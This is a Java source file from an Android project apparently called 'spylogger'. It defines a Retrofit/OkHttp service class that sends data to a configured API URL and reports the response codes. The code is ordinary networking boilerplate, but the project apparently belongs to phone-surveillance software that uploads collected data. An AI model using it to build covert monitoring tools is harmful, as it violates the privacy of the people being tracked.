package com.gravatasufoca.spylogger.services;

import android.os.Message;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.gravatasufoca.spylogger.helpers.RequestInterceptor;
import com.gravatasufoca.spylogger.helpers.TaskComplete;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

/**
 * Created by bruno on 01/12/16.
 */

public abstract class SendDataService<E> implements Callback<E>{

    private Retrofit retrofit;
    protected SendDataInterface sendApi;
    protected TaskComplete handler;

    public SendDataService(TaskComplete handler) {
        this.handler=handler;
        OkHttpClient.Builder client = new OkHttpClient.Builder();
        client.connectTimeout(10, TimeUnit.MINUTES);
        client.readTimeout(10,TimeUnit.MINUTES);
        client.writeTimeout(10,TimeUnit.MINUTES);
        client.addInterceptor(new RequestInterceptor());

        Gson gson = new GsonBuilder()
                .setDateFormat("yyyy-MM-dd HH:mm:ss")
                .setPrettyPrinting()
                .create();

        retrofit=new Retrofit.Builder()
                .baseUrl(SendDataInterface.apiUrl)
                .client(client.build())
                .addConverterFactory(GsonConverterFactory.create(gson))
                .build();
        sendApi=retrofit.create(SendDataInterface.class);
    }

    @Override
    public void onFailure(Call<E> call, Throwable t) {
        t.printStackTrace();
        if(handler!=null){
            Message msg=new Message();
            msg.what=500;
            msg.obj=t.getMessage();
            handler.onFinish(msg);
        }
    }

    @Override
    public void onResponse(Call<E> call, Response<E> response) {
        if(handler!=null){
            Message msg=new Message();
            msg.what=response.code();
            if(msg.what==200){
                msg.obj=response.body();
            }
            handler.onFinish(msg);
        }
    }
}
